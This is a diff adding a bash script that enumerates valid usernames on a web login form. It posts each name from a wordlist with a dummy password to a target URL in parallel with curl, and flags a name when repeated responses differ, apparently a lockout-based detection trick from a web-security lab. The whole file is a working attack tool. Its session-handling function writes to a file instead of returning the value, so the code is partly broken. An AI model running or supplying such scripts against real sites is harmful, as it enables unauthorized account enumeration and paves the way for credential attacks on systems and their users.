@@ -1,0 +1,49 @@
+#!/usr/bin/bash
+
+usernames=$1
+password="anytingklsafksdjhf48398erfhsljkdhfn04384hfsjkdhf43089fh83erh"
+url=$2
+threads=10
+
+find . -name "*response" -exec rm {} \;
+
+login() {
+	curl -s -o $5 -X POST -d "username=$1&password=$2" -H "session=$4" $3
+}
+
+get_session() {
+	curl -s -i $1 | grep "session" | cut -d "=" -f 2 | cut -d ";" -f 1 > session
+}
+
+running_jobs() {
+	jobs -rp | wc -l
+}
+
+execute() {
+	session=$(get_session "$3")
+	login "$1" "$2" "$3" "$session" "$1_response"
+	for i in $(seq 1 10); do
+		login "$1" "$2" "$3" "$session" "$1_tmpresponse"
+		if [ "$(cat $1_response)" != "$(cat $1_tmpresponse)" ]; then
+			echo "[!] Found Unmatching"
+			echo "$1..."
+			echo "$1" > valid_username
+			cat $1_tmpresponse > valid_response
+			break
+		fi
+		rm $1_tmpresponse
+	done
+	echo "$1: Invalid..."
+}
+
+while read -r user; do
+	while [ "$(running_jobs)" -gt "$threads" ]; do
+		sleep 0.1
+	done
+	[ -f valid_response ] && break
+	execute "$user" "$password" "$url" &
+done < $usernames
+
+wait
+rm session
+exit
